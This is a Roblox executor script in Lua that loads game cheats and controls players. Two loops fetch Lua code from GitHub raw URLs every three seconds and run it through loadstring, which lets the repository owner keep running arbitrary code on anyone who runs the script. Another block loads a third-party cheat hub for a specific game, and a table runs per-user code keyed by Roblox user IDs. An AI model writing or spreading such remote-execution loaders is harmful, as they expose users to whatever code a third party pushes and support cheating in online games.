--------------------------------------------------------------------------------------------------------

-- control all player













local URLLINKS = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/all_plyer_control.lua"
local ANTISPAMS = ""

local function LATESS(url)
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    local fullUrl = url .. "?v=" .. tick()
    
    if req then
        local success, res = pcall(function()
            return req({
                Url = fullUrl,
                Method = "GET",
                Headers = {
                    ["Cache-Control"] = "no-cache, no-store, must-revalidate",
                    ["Pragma"] = "no-cache"
                }
            })
        end)
        if success and res and res.Success then 
            return res.Body 
        end
    end
    
    local success, content = pcall(function()
        return game:HttpGet(fullUrl)
    end)
    
    return success and content or nil
end

task.spawn(function()
    while true do
        local content = LATESS(URLLINKS)
        
        if content and content:match("%S") and content ~= ANTISPAMS then
            ANTISPAMS = content
            
            local success, loadedFunc = pcall(loadstring, content)
            if success and loadedFunc then
                pcall(loadedFunc)
            end
        end
        
        task.wait(3)
    end
end)














-----------------------------------------------------------------------------------------------------------

-- player auto execute

















local URLLINK = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/auto_execute_player.lua"
local ANTISPAM = ""

local function lates(url)
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    local fullUrl = url .. "?v=" .. tick()
    
    if req then
        local success, res = pcall(function()
            return req({
                Url = fullUrl,
                Method = "GET",
                Headers = {
                    ["Cache-Control"] = "no-cache, no-store, must-revalidate",
                    ["Pragma"] = "no-cache"
                }
            })
        end)
        if success and res and res.Success then 
            return res.Body 
        end
    end
    
    local success, content = pcall(function()
        return game:HttpGet(fullUrl)
    end)
    
    return success and content or nil
end

task.spawn(function()
    while true do
        local content = lates(URLLINK)
        
        if content and content:match("%S") and content ~= ANTISPAM then
            ANTISPAM = content
            
            local success, loadedFunc = pcall(loadstring, content)
            if success and loadedFunc then
                pcall(loadedFunc)
            end
        end
        
        task.wait(3)
    end
end)














----------------------------------------------------------------------------------------------------------------

-- game script control

















if not game:IsLoaded() then
    game.Loaded:Wait()
end

local SupportedGames = {

-- script



[107778070777162] = function()     -- STEAL AN EGG

        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryuun0x/Clover/refs/heads/main/main.lua"))()  -- CLOVER HUB



    end,












}

local currentPlaceId = game.PlaceId
local scriptToExecute = SupportedGames[currentPlaceId]

if scriptToExecute then
    scriptToExecute()
end






















--------------------------------------------------------------------------------------------------------------

-- player control
















if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()


local Playercontrol = {


-------------------------------------------------------------------------------------------

-- xian



[10985692688] = function()  -- xianpog8839

-- anti lag
local Terrain = workspace:FindFirstChildOfClass('Terrain')
if Terrain then
    Terrain.WaterWaveSize = 0
    Terrain.WaterWaveSpeed = 0
    Terrain.WaterReflectance = 0
    Terrain.WaterTransparency = 0
end

game:GetService("Lighting").GlobalShadows = false
game:GetService("Lighting").FogEnd = 9e9

for _, v in pairs(game:GetDescendants()) do
    if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") then
        v.Material = Enum.Material.SmoothPlastic
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") then
        v:Destroy()
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") then
        v.Enabled = false
    end
end
------------------------------




end,



--------------------------------------------------

-- enzo


[1561035140] = function()  -- spylil123

print("lil phonk")

end,










}


local currentUserId = LocalPlayer.UserId
local targetScript = Playercontrol[currentUserId]


if targetScript then
    targetScript()
end






---------------------------------------------------------------------------------------










